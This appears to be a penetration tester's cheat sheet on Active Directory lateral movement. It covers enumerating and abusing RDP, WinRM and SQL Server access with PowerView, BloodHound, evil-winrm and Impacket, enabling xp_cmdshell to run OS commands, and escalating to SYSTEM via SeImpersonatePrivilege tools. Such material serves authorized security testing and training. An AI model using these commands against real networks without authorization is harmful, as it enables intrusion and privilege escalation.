# Privileged Access & Lateral Movement

After gaining an initial foothold, the objective is to move **laterally** or **vertically** to achieve domain compromise or specific assessment goals. If local administrative rights are obtained, **Pass-the-Hash** can be used via SMB; otherwise, other remote access protocols must be enumerated.

## Misconfigured Remote Access Permissions

Large-scale issues, such as the **Domain Users** group having unintended RDP or WinRM access, are common on **jump hosts** or **RDS hosts**.

|Misconfiguration|Impact|
|:--|:--|
|**Domain Users** in **Remote Desktop Users** group|Allows any domain user to RDP to the host; potential for credential theft or LPE.|
|**Domain Users** in **Remote Management Users** group|Allows any domain user WinRM access; often used for data hunting or privilege escalation.|
|**SeImpersonatePrivilege** enabled for SQL Service|Nearly guarantees **SYSTEM** access via tools like JuicyPotato or PrintSpoofer.|

---

## Remote Desktop (RDP)

**Scenario:** Use when a user has rights to RDP but may not have local admin privileges. This position is used to hunt for sensitive data or find **local privilege escalation (LPE)** vectors.

### 1. Enumeration

Determine if the current user or group has RDP privileges.

|Tool|Command / Method|
|:--|:--|
|**PowerView**|`Get-NetLocalGroupMember -ComputerName <TARGET_IP> -GroupName "Remote Desktop Users"`|
|**BloodHound**|Check **Execution Rights** on the **Node Info** tab or use pre-built queries: "Find Workstations/Servers where Domain Users can RDP"|

### 2. Execution

Connect to the target from either a Linux or Windows attack host.

|Platform|Tool|
|:--|:--|
|**Linux**|`xfreerdp` or `Remmina`|
|**Windows**|`mstsc.exe`|

---

## WinRM (Windows Remote Management)

**Scenario:** Use when a user is a member of the **Remote Management Users** group. This allows remote management without full local admin rights.

### 1. Enumeration

Identify WinRM access via PowerView or custom BloodHound queries.

**PowerView Workflow:**

```
Get-NetLocalGroupMember -ComputerName <TARGET_IP> -GroupName "Remote Management Users"
```

**BloodHound Raw Query:**

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf *1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote* 1..]->(c:Computer) RETURN p2
```

### 2. Execution (Windows Host)

Use PowerShell cmdlets to establish a remote session.

```
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $password)
Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred
```

### 3. Execution (Linux Host)

Use `evil-winrm` for an interactive shell.

**Installation:**

```
gem install evil-winrm
```

**Connection:**

```
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

---

## SQL Server Admin

**Scenario:** SQL servers often run under accounts with **sysadmin** privileges. Credentials may be found via **Kerberoasting**, **LLMNR spoofing**, or **Snaffler** (searching for `web.config` strings).

### 1. Enumeration

Identify SQL administration rights.

**BloodHound Query:**

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf *1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin* 1..]->(c:Computer) RETURN p2
```

**PowerUpSQL (Find Instances):**

```
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

### 2. Operating System Command Execution

If the account has sufficient rights, enable `xp_cmdshell` to execute OS commands.

**From Windows (PowerUpSQL):**

```
Get-SQLQuery -Instance "<TARGET_IP>,<PORT>" -username "<DOMAIN>\<USERNAME>" -password "<PASSWORD>" -query 'Select @@version'
```

**From Linux (Impacket):**

1. **Connect:**
    
    ```
    mssqlclient.py <DOMAIN>/<USERNAME>@<TARGET_IP> -windows-auth
    ```
    
2. **Enable Shell:**
    
    ```
    enable_xp_cmdshell
    ```
    
3. **Execute:**
    
    ```
    xp_cmdshell whoami /priv
    ```
    

### 3. Privilege Escalation

SQL accounts often possess **SeImpersonatePrivilege**. This allows escalation to **SYSTEM** level using tools like **JuicyPotato**, **PrintSpoofer**, or **RoguePotato**.